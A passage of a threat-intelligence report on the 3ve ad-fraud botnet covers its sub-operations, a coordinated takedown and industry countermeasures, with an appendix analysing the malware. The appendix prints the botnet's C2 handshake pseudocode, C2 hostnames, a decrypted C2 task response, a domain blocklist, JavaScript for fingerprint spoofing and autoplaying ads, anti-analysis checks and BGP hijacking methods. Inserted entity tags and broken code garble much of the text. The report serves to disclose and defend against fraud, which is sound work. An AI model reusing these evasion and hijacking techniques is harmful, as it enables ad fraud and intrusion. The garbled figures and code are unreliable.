from command andcontrol server . Infected computer opens hidden browsers and visitsa fake web page ( via a redirect server).Web pages generate ad requests to receive ads from the programmaticsupply chain.3ve.2 architecture123ve.3The [ORDINAL] third 3ve - associated sub - operation was similar to the others in that it registered its ad fraud bot networks under different [ORG] IP addresses in order to hide their activity . Like 3ve.1 , [CARDINAL] 3ve.3 \u2019s bots were based in a few data centers , but it used the [ORG] IP addresses of other data centers instead of residential computers to cover its tracks . Again , data centers are far more suspicious to advertisers worried about bot traffic , but [CARDINAL] 3ve.3 \u2019s strategy still allowed its operators a good degree of agility by allowing them to find new data centers as soon as old data centers were blocked . Although easier to detect , this approach allowed them to commit ad fraud more efficiently \u2014 data centers can offer greater bandwidth than [CARDINAL] hundreds [CARDINAL] of [CARDINAL] thousands of residential computers.1,000+Ad [GPE] Fraud operator writes instructions and uploads it to their data center botnet . The data center computersopen [CARDINAL] thousands of web browsers and contact acommand and control relay . The command and control relays direct the data center browsers to proxy their traffic through data center [ORG] IPs and visit fake and realweb pages . Those fake web pages generate ad requests toreceive ads from the programmaticsupply chain.3ve.3 architecture13Taking [ORDINAL] 3ve downWith each detail we uncovered [CARDINAL] about [CARDINAL] 3ve and its inner workings , it became clearer that a typical blacklisting effort would only cause portions of the operation to momentarily go offline , giving [CARDINAL] 3ve \u2019s operators a chance to reset a short time later.3ve \u2019s sheer size and complexity posed a significant risk not just to individual advertisers and publishers , but to the entire advertising ecosystem . We had to shut the operation down for good , which called for greater , more calculated measures . To that end , it was critical that we played the long game , endeavoring to have a more permanent , more powerful impact against this and future ad fraud operations . To dismantle [ORDINAL] 3ve and prevent its return , collaboration was needed from major partners across the digital media space , from web publishers to anti - virus companies . Although a technical takedown was necessary , historically technical measures alone have not always been sufficient to prevent a recurrence in the past . A takedown combined with prosecution would more fully disrupt the criminal organization and serve as a deterrent to similar activity by other actors . Taking this approach meant spending time collectively researching and investigating the operation , allowing us to map out its infrastructure , its monetization strategy , and its major components . The industry working groupIt was this conclusion that prompted the creation of the industry working group , which included a variety of stakeholders including [ORG] White [ORG] Ops , Google , [CARDINAL] 15 other major industry parties , and members of the information security community . This working group used the diverse expertise of its various partners to analyze and understand [ORDINAL] 3ve . [CARDINAL] One of the working group \u2019s main goals was collaborative intelligence . The working group spent [DATE] months observing 3ve \u2019s activities , working to build an invaluable technical approach to identifying and defending against similar threats in the future . The working group spent [DATE] months observing 3ve \u2019s activities , working to build an invaluable technical approach to identifying and defending against similar threats in the future . The success of the working group can largely be credited to the wide range of perspectives and skill sets represented by its participants . The diverse vantage points and indispensable insights of key ad tech companies and several ISPs were instrumental in understanding [CARDINAL] 3ve \u2019s impact , while anti - virus specialists worked to understand the malware that was written and installed onto residential computers as a way to provide cover for the botnet \u2019s data centers . Our investigation and analysis of [CARDINAL] 3ve was expedited by this cross - functional collaboration with industry partners . Indication of a successful takedownA coordinated takedown of infrastructure related to [CARDINAL] 3ve \u2019s operations occurred recently . The takedown involved disrupting as much of the related infrastructure as possible to make it hard to rebuild any of [CARDINAL] 3ve \u2019s operations . Technical takedowns like these require detailed understanding of the internal aspects of the fraud operations and extensive collaboration across many companies from various parts of the industry . As the graph below demonstrates , declining volumes in invalid traffic indicate that the disruption of infrastructure thus far has been successful , bringing the bid request traffic close to [CARDINAL] zero within [TIME] 18 [TIME] hours of starting the coordinated takedown . Our sincere gratitude and appreciation to everyone involved with this takedown [FAC] effort.14s [FAC] Bi12:00 AM12:00 PM12:00 AM12:00 PM12:00 AM12:00 PMTimeIncoming [CARDINAL] 3ve.2 bid requests ( via OpenRTB protocol)Uniting the industry against future attacksWhenever a major ad fraud operation like this is uncovered , it serves as a wake - up call to those involved in digital advertising . Not only is it necessary to reinforce traditional guards against ad fraud , but [CARDINAL] three critical tactics need to be adopted to account for the rapidly evolving capabilities of automated threats like 3ve.1 . Create and adopt industry standards like ads.txt \u2014 The industry is working on new tools to protect itself from adfraud . [ORG] Ads.txt was created by [LAW] the [LAW] IAB [LAW] Tech [LAW] Lab to help prevent domain spoofing by allowing publishers to create public files of \u201c [WORK_OF_ART] Authorized [WORK_OF_ART] Digital [WORK_OF_ART] Sellers . \u201d These files make it easy to see which parties are authorized to sell that publisher \u2019s ad inventory . Adoption of ads.txt has been very strong : to date [CARDINAL] over [CARDINAL] 500,000 domains have published ads.txt files . As more sell- and buy - side platforms continue to roll out their enforcement and advertisers opt to only buy inventory from domains with ads.txt files , the potential for fraudsters to profit from selling counterfeit inventory will be [ORG] minimized.2 . Be mindful and proactive about ad fraud \u2014 There are a number of heuristics that advertisers can use to ensure that whatever ad fraud solution they have in place is working . [CARDINAL] One good rule of thumb : if it seems too good to be true , it probably is . That means if you start implementing an anti - fraud solution that decreases your fraud rate , but does n\u2019t cause your [ORG] CTR to drop with it , it \u2019s likely that your solution is n\u2019t quite working correctly . Similarly , your ad fraud rate should be changing over time , as there is inherent variability in traffic volumes.3 . Use a layered methodology for fighting ad fraud \u2014 Much of our experience with [ORDINAL] 3ve demonstrates just how good bots have become at imitating human users . Advertisers and publishers should therefore take a layered approach to bot traffic and ad fraud detection , using both in - house defenses and [ORDINAL] third - party verification to look for all the indicators of bot - controlled computers.15To give a concrete example of the value of industry collaboration , consider the ads.txt status for [CARDINAL] 3ve \u2019s traffic . As shown in the graph below , [PERCENT] more [PERCENT] than 80 [PERCENT] % of the incoming ad bid requests that [ORDINAL] 3ve generated in [DATE] early [DATE] 2018 were unauthorized ( \u2018 unauthorized \u2019 in this context means that the bid requests were offered for sale by sellers that were not listed as authorized sellers in a domain \u2019s ads.txt file ) . If all ad tech companies and advertisers enforced ads.txt and stopped buying or selling unauthorized inventory , [PERCENT] over 80 [PERCENT] % of all [ORDINAL] 3ve inventory would be completely blocked across the entire industry ads.txt status for 3ve traffic8.6 % Authorized ( Direct)11 % Authorized ( Indirect)80.3 [PERCENT] % [ORG] Unauthorizedads.txt status for recent 3ve traffic3ve \u2019s takedown represents [CARDINAL] two important milestones for the digital advertising industry : [ORDINAL] First , it demonstrates the power of industry collaboration in confronting sophisticated ad fraud operations . [ORDINAL] Second , that law enforcement action sends a clear message that committing ad fraud can have significant consequences , which is likely to discourage would - be cybercriminals . Curtailing ad fraud is not only good for the digital advertising ecosystem , but also the [CARDINAL] billions of people who rely on the Internet to be a safe place where they can access services and information that add value to their lives . We believe that both the intelligence we \u2019ve gained from [ORDINAL] 3ve , and subsequent law enforcement action , should make it riskier and harder for similar operations to profit in the future.16AppendixWe\u2019ve included the sections below to expand on the details and context provided for [DATE] 3ve \u2019s [DATE] three sub - operations in the main body of this document.3ve.1Operating as a proxy in user \u2019s PCsWhenever the 3ve.1 binary was executed , it would start collecting specific information about the PC on which it was running . Among other things , the binary would read [ORG] the [ORG] Computer [ORG] Name , Volume Serial Number , Machine GUID , the full path of the running process ( in this case , c:\\test\\ eve.exe ) , and time zone . Then , it would build a hash table of known programs that are typically used by analysts . Finally , it used the typical CreateToolhelp32Snapshot/ Process32NextW to enumerate all running processes and cross - reference them with the hash table.3ve.1 \u2019s binary did the same thing with device drivers , checking for the presence of VMs , remote access software ( LogMeIn ) , CD - ROM type , etc . If anything went wrong , it would sleep forever without executing any fraud - like requests . While running all these checks , it would also copy itself to other locations and drop a new binary file into C:\\Users\\ \\AppData\\Local\\ VirtualStore\\lsass.aaa . All this information would be appended to a big string , which was [ORG] RSA - encrypted ( with a hard - coded key ) and sent to the server . To be clear , the [ORDINAL] first message included both the user info and the RC4 key , and was encrypted with an [ORG] RSA public key . If the [CARDINAL] C2 confirmed that it was safe to start executing commands , the following messages would be quickly encrypted with RC4 using the previously generated RC4 key . The [ORDINAL] first of [CARDINAL] 3ve \u2019s [CARDINAL] three ad fraud sub - operations , 3ve.1 , was a hybrid operation , and was itself composed of [CARDINAL] three main layers : an army of bots in multiple [NORP] European data centers , a layer of exit nodes ( the [ORG] IP addresses that the ad requests appear to originate from ) comprised of malware - infected user computers or stolen corporate [ORG] IP space , and a command and control ( C2 ) layer that directed the malware and ad fraud bots on every transaction . This sub - operation was primarily focused on video fraud , selling counterfeit video inventory to advertisers on counterfeited domains . This layered architecture allowed the operators to keep their bot software isolated , proxying all activity through both infected user computers and through [ORG] IP space stolen from corporations via Border Gateway Protocol ( [ORG] BGP ) hijacks . Acquiring [ORG] IP addresses this way is significant because it constitutes a particularly blatant form of fraud , used to corrupt large groups of [ORG] IPs by interfering directly with an exterior routing protocol . If [CARDINAL] one of these stolen [ORG] IP addresses was detected as the source of fraudulent activity , it was easily burned and recycled , while the same bots continued running in the data centers behind it . The operation \u2019s ability to continuously find new IPs through which to proxy gave it a layer of protection and isolation , avoiding any \u201c single point of failure \u201d that could allow us to easily eradicate it . The ad fraud bot operation was comprised of [ORG] Miuref / [ORG] Boaxxe infected - computers . This bot farm largely relied on [ORG] Chrome and Internet Explorer . While the number of [ORG] IPs hijacked from corporations ranged from [CARDINAL] 200,000 [CARDINAL] to [CARDINAL] 500,000 at any given time , the malware infection footprint appears to have remained at [CARDINAL] less [CARDINAL] than [CARDINAL] 5,000 infections across the globe.17pn : C:\\Test\\eve.exe un : davidcopperfield cn : DESKTOP-1Z8V3O1 cpu:1,1,Intel(R ) Core(TM ) i7 - 6600U CPU @ [CARDINAL] 2.60GHz sk : uwomanrx ( RC4 Key used for future communication)Message sent and encrypted for 3ve.1 to start executing commands . Before encryption\u2193 [ORG] FRO ------- u : x x x x x x x x x [DATE] 6 [DATE] 4 a 7 2 2 0 5 4 c [CARDINAL] 8 c 2 8 8 8 e f 9 3 b b \u25d9 o : [CARDINAL] 6 . [CARDINAL] 2 . [CARDINAL] 9 2 0 0 \u25d9 b : [CARDINAL] 6 [CARDINAL] 4 \u25d9 a : [CARDINAL] 0 \u25d9 c : [CARDINAL] 1 \u25d9 v : [CARDINAL] 1 0 [CARDINAL] 0 \u25d9 s : [CARDINAL] 0 \u25d9 r : [CARDINAL] 1 \u25d9 [CARDINAL] 1 : [CARDINAL] 2 0 0 0 \u25d9 d : [CARDINAL] 1 [CARDINAL] 2 \u25d9 n : [CARDINAL] 5 \u25d9 c p : 1 0 \u25d9 c r : f 0 [CARDINAL] 5 [CARDINAL] 4 [CARDINAL] 6 e 2 8 \u25d9 b t : [CARDINAL] 1 d 2 2 5 e c . f [CARDINAL] 1 c 7 f a 1 0 \u25d9 p n : C : \\ T e s t \\ e v e . e x e \u25d9 u n : m X X X X X a c o c n : D E S K T O P - 1 X X X X 0 1 \u25d9 c p u : [CARDINAL] 1 , 1 , I n t e l ( R ) Core ( TM ) i7 - 66 z \u25d9 \u00bd\u00bd\u00bd\u00bd\u00bd\u00bd\u00bd\u00bdAfter encryption and [ORG] encoding\u2193 [ORG] FRO ------- N E p 9 3 E 3 S h q S V b I k H % [CARDINAL] 2 b g C Q t n G 8 K 4 8 b J w K 0 g Q T l g f [CARDINAL] 2 G m [CARDINAL] 6 V u q [DATE] N [DATE] 5 O E k 4 4 M q J 5 L F u x k s [CARDINAL] 6 m i r o c I Q p h D 9 9 8 V p W H u [CARDINAL] 8 H W 1 C 5 3 y M 2 O 1 O o R m w t 3 6 G i 7 h q Z e 3 Y F b I v u X J W o r s W o y [PERCENT] F [PERCENT] % 2 f u U u s 7 D c n J N a s Y 1 S k v [PERCENT] 8 [PERCENT] B [PERCENT] n B u f p h v W 1 c O O K v [CARDINAL] 8 m W d V L G Y 6 Q 0 z 7 3 f h W z i 4 4 r K y J I d x d d a k d A h i W U % 2 b v E m j e r y z Y L V O L i J A 0 [PERCENT] 3 [PERCENT] % 2 f k J G N 5 1 G v B D T r n 0 [CARDINAL] 4 MYnpx4rxLpXkw9nb3ve.1 messages before and after encryption and encoding.18Network communication3ve.1 used [CARDINAL] three different sets of APIs to communicate with its [CARDINAL] C2 servers . The [ORDINAL] first request was done by instantiating an Internet . Explorer COM Application and using its [ORG] Navigate2 method to generate a GET request eax , [ edp+ppv ] offest rclsid_Internet_Explorer ; rclsid dword ptr [ ecx+OD Oh ] ; iexplore . Navigate2 esi , ds : GetTickCount esi ; GeTickCount [ edp+psz ] , eax ; ppv ; pUnkOuterCoCreateInstance that instantiated the Internet . [PERSON] Explorer [PERSON] CLSID and spawn a windowless iexplore.exe process . The above CoCreateInstance would instantiate the Internet . Explorer CLSID { 0002DF01 [TIME] - 0000 [TIME] - 0000 - C000- [DATE] 000000000046 } , spawning a windowless iexplore.exe process , then would use its [ORG] Navigate2 method to send the encrypted PC data to their [CARDINAL] C2 server . We were able to easily pinpoint the instantiated COM by searching the CLSID in the registry . The search returned quickly , showing us that it belonged to Internet Explorer . Internet . Explorer . Application Registry KeyInstantiated COM registry location within Internet Explorer19Right after the Navigate2 , 3ve.1 used the Wininet API [ InternetConnectA / HttpSendRequestA ] to do the same request from its own process . However , at this stage , it would set different flags using the InternetSetOptionA \u2014 this was probably a measure used to bypass the local proxy . All these wininet calls were not visible in the [ORG] PE import table because they were loaded at runtime via kernel32.dll LoadLibrary / GetProcAddress . The communication from this point on would be channeled exclusively through the low - level [PRODUCT] Windows [PRODUCT] Sockets 2 API . This both gave 3ve.1 \u2019s operators more control and bypassed the local proxy.3ve.1 C2 handshakeThe binary had several hard - coded ( but encrypted ) hostnames inside . For example , there was an array of servers named [ d].winsrw.com where the [ORDINAL] first digit would change from [CARDINAL] 1 to 5 . Once the malware was sure it had Internet access ( by sending a couple of requests to microsoft.com ) , it would get the IPs of those servers using the gethostbyname function . Finally , it would connect to them using the Windows socket API.Then , 3ve.1 would send the same user / PC information to one of the winsrw.com servers , expecting to receive an \u201c OK . \u201d But the server is pretty selective , and checks several things before accepting : for example , Windows language / locale information should be [LANGUAGE] English , and the [ORG] IP must be in the [GPE] US range . The pseudocode below describes better how this works \u2014 just keep in mind that both the request and response are always encrypted . Client ( Malware)Socket->Connect(Get_IP(2.winsrw.com ) ) Repeat Every 30\u201dSocket->Send(PC_INFO ) If ( Response = = \u201c OK\u201d)Start_Ad_Fraud ( and stop checking every 30\u201d)Server ( C2 from * .winsrw.com)If ( PC_INFO = = REAL_PC AND IP_LOCATION = = [GPE] US ) Response->MORE_COMMANDSNO_REPLYPseudocode describing 3ve.1 \u2019s C2 handshakeAs described above , the [CARDINAL] C2 replies back an OK if the user information matches what they consider a valid PC and if the [ORG] IP is in the US.20BGP hijackingThe Internet is composed of many independent networks ( referred to as \u201c [WORK_OF_ART] Autonomous [WORK_OF_ART] Systems , \u201d or ASs , each assigned a unique identifier called an [ORG] ASN ) , all tied together via something called \u201c [WORK_OF_ART] Border [WORK_OF_ART] Gateway [WORK_OF_ART] Protocol \u201d or ( [ORG] BGP ) . Through [ORG] BGP , these networks are able to build a globally shared \u201c routing table \u201d that allows them to easily determine how any one [ORG] IP address can connect to any other . The problem is that [ORG] BGP was designed during a more innocent time for the Internet , when it was small and everybody trusted each other . While some improvements to security have been made over [DATE] the [DATE] years , it still primarily relies on trust \u2014 and the implied threat of being cut off if one misbehaves . But people who attempt to game this system wo n\u2019t be cut off if no one notices or cares about their misconduct , and there are still a lot of unused and forgotten [ORG] IP addresses out there that criminals might use to mask unscrupulous activity . This presents an opportunity for bad actors to do something known as \u201c [ORG] BGP hijacking . \u201d [CARDINAL] One group of such actors came to our attention in early 2017.The [ORG] BGP hijacking operation used by [ORDINAL] 3ve had been set up long before we started seeing it used for fraud on a non - trivial scale . Historical routing data shows the core AS \u201c [WORK_OF_ART] ALPHA \u201d used in the beginning of the operation came online in [DATE] 2013 , while the low - volume , low - sophistication bot activity [PERSON] White [PERSON] Ops has seen only dates back to [DATE] 2015 . The routing setup was simple : just the core [ORG] ALPHA [ORG] AS and a few directly attached networks , connected via a single transit provider . We are uncertain whether the [ORG] IP space they were using was legitimately obtained or not , but the goal of phase [CARDINAL] 1 seems to have been to establish some history for [ORG] ALPHA before it started doing shady things . IPsIPsIPsIPsIPsIPsDefunct [ORG] ASN [CARDINAL] 1Defunct [ORG] ASN 2ASN AlphaTransitDefunct [ORG] ASN 3Initial 3ve.1 [ORG] BGP hijacking operation structureIn [DATE] early [DATE] March [DATE] of [DATE] 2017 , [ORG] ALPHA began to abuse its position of trust within [ORG] BGP . They chose defunct ASs that had been inactive for quite some time and set them up behind their own AS . [ORG] IP addresses were required to make this useful , so they found some [ORG] IP networks that were n\u2019t being used and began advertising them from the defunct ( now zombie ) ASs . [ORG] ALPHA was very careful about which entities it decided to impersonate \u2014 many still had functional ( though badly out of date ) websites . In many cases , [ORG] ALPHA chose ASs formerly used by Internet service or hosting providers , along with IPs used by companies that were from the same geographic region . The next stage of evolution came in [DATE] late [DATE] August . AS BRAVO came online ( also in [LOC] Eastern [LOC] Europe ) , which had several transit providers , including the [CARDINAL] one serving AS ALPHA , connecting it to the Internet . This made it more resilient in case any of its transit providers were to bring down the hammer on its illegal activities . AS BRAVO used an even more complicated network setup \u2014 it had several defunct ASs attached to it , each of which in turn had several more defunct ASs attached through which to actually route [ORG] IP addresses . This configuration made it look more like a legitimate network , and also increased the rate of \u201c churn \u201d of ASs and IPs so that it could respond to blocks faster . Use of AS ALPHA was slowly phased out as AS BRAVO ramped up.2120,000,00015,000,00010,000,000500,00004/1/20177/1/201710/1/20171/1/2018Current IPsCumulative IPs3ve.1 [ORG] BGP hijacked IPs in current vs. ever in useIPsIPsIPsIPsDefunct [ORG] ASN 3Live [ORG] ASNDefunct [ORG] ASN [CARDINAL] 1IPsIPsDefunct [ORG] ASN 5Spoofed ConnectionASN BRAVOIPsIPsLive ASNDefunct [ORG] ASN [CARDINAL] 2TransitSpoofed ConnectionLater stage structure of [CARDINAL] 3ve.1 \u2019s [ORG] BGP hijacking operation22Apparently frustrated by blocking , they began using a new technique , just in time for [DATE] the [DATE] end [DATE] of [DATE] 2017 . Instead of relying only on defunct ASs , they started impersonating live , legitimately used ones as well . This works because it is perfectly fine for the same AS to have multiple \u201c points of presence \u201d on the Internet as long as it \u2019s only advertising routing for some of its [ORG] IP addresses at each point . With this change , attempting to identify defunct ASs and block all their IPs would result in collateral blocking . Further , phantom connections to well known transit providers were spoofed to further muddy the waters for automated analysis . They even appeared to be providing transit to some legitimate networks . Despite all the obfuscation , automated identification of this activity is still possible.3ve.23ve.2 used malvertising and social engineering to infect [CARDINAL] approximately [CARDINAL] 700,000 [NORP] Windows computers at any given time \u2014 a truly significant reach for any cybercriminal operation . The actual infection chain has been documented in detail by [PERSON] Kafeine and other [GPE] Proofpoint staff . It is using social engineering to lure victims into downloading and executing fake [PERSON] Chrome , Firefox , or [PERSON] Flash updates . The [ORDINAL] 3ve sub - operation removed the need for data center - based browser farms , instead embedding the entire ad fraud component into malware executed by its victims \u2019 infected computers . This approach greatly simplified the botnet \u2019s data center operation by pushing complexity into the malware . 3ve.2 is responsible for the majority of [CARDINAL] 3ve \u2019s total outbound network traffic . Counterfeit websites3ve.2 \u2019s main component was its browsing module , which was responsible for browsing counterfeit websites and subsequently executing the ad fraud activity . These sites , hosted on servers in data centers , are templated sites that mainly contain an ad space and its supporting ad libraries along with some scraped content from legitimate websites . To execute the ad fraud , 3ve.2 instructed its browser - bot army to visit these counterfeit sites , loading them in programmatically - driven browsers to generate artificial ad impressions . The ad fraud component was based on [ORG] the [ORG] Chrome [ORG] Embedded [ORG] Framework ( [ORG] CEF ) , which the botnet \u2019s authors heavily customized to better mimic a typical [GPE] Chrome instance . [CARDINAL] 3ve.2 hijacked domain name resolution ( [ORG] DNS ) requests originating from the [ORG] CEF , instructing the bot on the victim \u2019s machine to visit [CARDINAL] 3ve - controlled counterfeit websites instead of the original domains . Hijacking DNS resolution for the [ORG] CEF process keeps [CARDINAL] 3ve \u2019s victims unaware of the malware on their computers . Since the [ORG] DNS hijacking was isolated to the [ORG] CEF requests the user \u2019s regular browsing activity remained unaffected . We were able to identify [CARDINAL] three different sources of counterfeit websites ( referenced as templates ) that [CARDINAL] 3ve.2 visited . We believe 3ve.2 was able to monetize capacity by counterfeiting benign websites . Below are screenshots and [ORG] JavaScript code snippets used to render the ads on each of those templates.233ve.2 Template AThe top screenshot below shows an anonymized example of an original website while the bottom screenshot is the counterfeit equivalent for the same domain . The counterfeit page only includes a video ad and a few links below it . Original websiteCounterfeit [ORG] website\u2022 [ORG] Watch [ORG] More [ORG] Funny [ORG] Movies on [ORG] FilmPhile [ORG] \u2022 [ORG] Watch [ORG] Live [ORG] TV on [PRODUCT] FilmPhile [PRODUCT] \u2022 Closed Captioning \u2022 American Sis - Sibling Rivalry - FilmPhile \u2022 Watch This Season \u2019s Comedy on FilmPhile \u2022 Here \u2019s What Happened on American Sis - The Secret Society of Super Sisters - FilmPhile \u2022 Turned - All Is Not Gone - FIlmPhile \u2022 CD [ORG] League [ORG] - Semifinals / Grand [ORG] Final [ORG] - [ORG] FilmPhile \u2022 [ORG] Search [ORG] \u2022 [ORG] Help243ve.2 [ORG] Template [ORG] BThis HTML template is arbitrarily defining the size of the player based on the current time.<div id=\u201cad_content \u201d > < div id=\u201cjw7113\u201d></div > < div id=\u201cbanners \u201d > < script src=\u201cXXX\u201d></script > < script language=\u201cjavascript1.1 \u201d src=\u201cXXX\u201d></script > < /div>[1025,575 ] , ] ; [CARDINAL] 2 var resolutions = [ [CARDINAL] 9 var date = new Date ( ) ; [CARDINAL] 10 var item = date.getMinutes ( ) % [CARDINAL] 5 ; [CARDINAL] 11 var width = resolutions[item][0 ] ; [CARDINAL] 12 var height = resolutions[item][1 ] ; [CARDINAL] 21 < script type=\u201ctext / javascript \u201d > [CARDINAL] 22 var playerInstance = jwplayer(\u2018jw7113 \u2019 ) ; [CARDINAL] 23 playerInstance.setup ( { [CARDINAL] 24 file : \u2018 /movies.mp4 \u2019 , [CARDINAL] 25 width : width , [CARDINAL] 26 height : height , [CARDINAL] 27 autostart : true , [CARDINAL] 28 primary : \u2018 flash \u2019 , [CARDINAL] 29 repeat : true , [CARDINAL] 30 controls : false , [CARDINAL] 31 advertising : { [CARDINAL] 32 client : \u2018 vast \u2019 , [DATE] 33 tag : \u2018 XXX=\u2019+width+height [CARDINAL] 34 } [CARDINAL] 35 } ) ; [CARDINAL] 3ve.2 Template B code snippet253ve.2 Template CThis template randomly decides where to place a video ad on the page by extracting arbitrary X , Y coordinates from the page URL.while(checksum>50 ) { checksum = [DATE] checksum-50 ; } return checksum+10;if(t==2){while(checksum>80 ) { checksum = [DATE] checksum-80 ; } return checksum+10;checksum + = ( s.charCodeAt(index ) * ( index + [CARDINAL] 1)+t);var index ; if(t==1){var checksum = [DATE] 12345678 ; } if(t==2){var checksum = [CARDINAL] 00000000;s = s+s ; } for ( index = [CARDINAL] 0 ; index < s.length ; index++ ) { if(t==1){1 function xy_checksum(s , t ) { [CARDINAL] 21 function [ORG] place_player(pl ) { [CARDINAL] 22 pl.style.position = \u2018 absolute \u2019 ; [CARDINAL] 23 pl.style.left = xy_checksum(window.top.location.href,1)+\u2019% \u2019 ; [CARDINAL] 24 pl.style.top = xy_checksum(window.top.location.href,2)+\u2019% \u2019 ; [CARDINAL] 29 } catch(e ) [CARDINAL] 32 } ads_placer_work.add_ad_element(document . getElementById(\u2018mainvd\u2019),\u201dvideo\u201d,\u201d576x344\u201d);place_player(document.getElementById(\u2018mainvd\u2019));3ve.2 Template C code snippet26Hidden Windows3ve.2 used hidden windows on a hidden desktop to conceal its activity on an infected user \u2019s machine . It \u2019s common for malware that needs to hide a window to use either hidden windows or a hidden desktop , but rarely both . The hidden desktop was discovered while analyzing a memory dump . This added a further level of obfuscation because Windows 7 does not support multiple desktops . The exception to this type of setup is through the use of the Windows API . The legitimate use for this feature is creating a new desktop for another user who wants to log in . We observed that when the malware created the new desktop , it did n\u2019t create a new instance of explorer.exe . This meant that an analyst would n\u2019t be able to easily access their tools , because there would n\u2019t be a way to create processes on this desktop due to the absence of a running instance of [ORG] Explorer . Fake [PERSON] Browsing [PERSON] BehaviorTo avoid detection , [CARDINAL] 3ve.2 exhibited a human - like behavior through mouse movements and clicks , occasionally blocked verification libraries ( by leveraging [CARDINAL] two separate techniques ) , while also generating false , but seemingly organic , data . Mouse movementsWe\u2019ve seen 3ve.2 scroll around the screen or move the mouse in a simplified \u201c human \u201d manner . Examples of mouse movements from 3ve.227Patching functionsThe malware also patched some functions that are usually implemented in native code . For example , it spoofed various items related to the environment such as the [ORG] AudioContext values ( see code used for [ORG] AudioContext spoofing below ) . It also used JavaScript to find links on the page on which to click . These snippets of code were used to override the browser \u2019s built in functionality , so that the C2 could control what the browser reports to the site . So instead of running a native code function from the [ORG] JavaScript engine , the malware \u2019s patched version is executed to let the bot look more organic . JavaScript code that patched properties such as [PRODUCT] maxChannelCount in the browser28Playing mediaThe malware contained an interesting code snippet , a few lines of [ORG] JavaScript , that was used to play media on a page . The malware authors included a few try catch statements which loop through all of the elements on a page named either \u2018 embed \u2019 , \u2018 object \u2019 , or \u2018 video \u2019 and then tried to call play ( ) , playVideo ( ) , or start ( ) on them . It did so to try to maximize the payout for each site visit by attempting to play the respective video ads . JavaScript to automatically play video [LAW] ads29Tag [LAW] evasion3ve.2 used a regular expression matching technique for blocking unwanted assets on a page . This was done through a variable in the C2 \u2019s response named bbb_l_m ( more details below ) . When a website was loaded , the malware looped through every URL in the site and passed each of them to a function that checked the URL against a regex to determine whether a resource should be blocked or allowed . For example , this technique was used to block the White Ops JavaScript tag . Function \u2019s assembly to determine whether a resource should be blocked or allowedIf the URL matched the regular expression , the function would return [CARDINAL] 1 , and the URL being operated upon would be replaced with the string \u201c none , \u201d thereby blocking the resource from ever being downloaded or executed . Otherwise , If the URL did n\u2019t match , the function returned 0 and the resource was not blocked . Another method of evasion that 3ve.2 used was a string blacklist based on the components of a resource found in the bbb_j_m C2 variable . If any of these strings were identified within a resource ( e.g. , [ORG] JavaScript or HTML ) , the respective resource on the website [CARDINAL] 3ve.2 visited would n\u2019t get rendered or executed . For example , bbb_j_m contained strings from the White Ops JavaScript tag , and strings related to crypto - jacking such as cryptonight , CoinHive , CryptonightWASMWrapper , and abortOnCannotGrowMemory . [CARDINAL] 3ve.2 prevented crypto - jacking scripts from executing because they might lead to inadvertent detection of the malware.if a user noticed noticed their computer was running slower , hotter or noisier ( due to fans spinning up ) than normal due to the cryptocurrency mining running in the background . Non - counterfeit domains browsingFinally , in addition to visiting counterfeit websites , 3ve.2 instructed residential bots to visit legitimate domains . This was likely done to participate in traffic - selling schemes , and to better blend in with organic traffic by gathering cookies from legitimate websites . C2 instructions3ve.2 \u2019s ad - fraud module requested new tasks from the command & control servers [TIME] every [TIME] few [TIME] minutes . The following request sent from the bot to the servers provides details about the infected machine \u2019s state . For example , it includes a unique bot i d , a bot version , language , operating system version.mode=3&UID= & clicks=3&uknerr=0&referr=0&hproc=0&fcproc=0&fproc=0&fthr1=0&fthr2=0 US&chrome=1&w_cont=7&cont_err=1&lastcie= & os_number=6.1&fd=3ve.2 \u2019s ad fraud task request ( decrypted and anonymized ; obtained via API hooking)30The [CARDINAL] C2 replies with a list of tasks to perform in the next time slot . Each of these tasks instructs 3ve.2 \u2019s embedded browser to visit a given URL with a custom environment , which e.g. includes a fake user agent , screen resolution , plugins , and a regular expression of [ORG] JavaScript sources to prevent from loading ( mainly for blocking verification code and browser - based crypto mining).RESP : OK|url|<>|url|<>|0:00:00:00:00:00:00:00:00 : 00::||scrl_cfg:000000 [QUANTITY] - 00000 [QUANTITY] - 68 : scrl_cfg|fcs_cfg:3000 - 2194 : fcs_cfg||p_hhw:100 : p_hhw|w_w _ perc:5 : w_w_perc|scrtype:2 : scrtype|setcpu:1 : setcpu|veryfast:93 : veryfast|lowl_c:0 : lowl _ c | m i n m s : [CARDINAL] 4 [CARDINAL] 4 : m i n m s | h s t _ c o u n t : [CARDINAL] 4 : h s t _ c o u n t | c h e c k j s c m d : [CARDINAL] 1 : c h e c k _ j s c m d | d o m s _ spoof : coinhive.com>0||coin - hive.com>0||jsecoin.com>0||reasedoper.pw>0||mataharirama . xyz>0||listat.biz>0||lmodr.biz>0||minecrunch.co>0||minemytraffic.com>0||crypto [ORG] - loot.com > 0||2giga.link>0||ppoi.org>0||coinerra.com>0||coin - have.com>0||kisshentai.net>0|| miner.pr0gramm.com>0||kiwifarms.net>0||anime.reactor.cc>0||joyreactor.cc>0|| kissdoujin.com>0||minero.pw>0||coinnebula.com>0||afminer.com>0||coinblind.com>0|| w e b m i n e . c z > 0 | | m o n e r o m i n e r . r o c k s > 0 | | c d n . c l o u d c o i n s . c o > 0 | | c o i n l a b . b i z > 0 | | papoto.com>0||edgeno.de>0||jyhfuqoh.info>0||ads - miner.appspot.com>0||www.hashing . win>0||:doms_spoof||bbb_l_m:^http[^\\?&]{1,128}/ \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 { \u2588 \u2588 }/( \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 ).js|| : [CARDINAL] bbb_l _ m| bbb_j_m : cryptonight||CryptonightWASMWrapper||CoinHive|| \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 || \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 ||:bbb_j_m||force_use_cont_id::44::force_use_cont_id|hos crm:6.1 : hos _ crm|hfont_crm : Arial Greek . [PERSON] Arial [PERSON] Cyr . Leelawadee UI Semilight : hfont_crm|flash_p : plugins\\ |setua : Mozilla/5.0 ( Windows NT 6.1 ) [ORG] AppleWebKit/537.36 ( [ORG] KHTML , like [ORG] Gecko ) Chrome/63.0 . [CARDINAL] 3239.84 Safari/537.36 : setua|scr_data:1920x1080 [CARDINAL] - 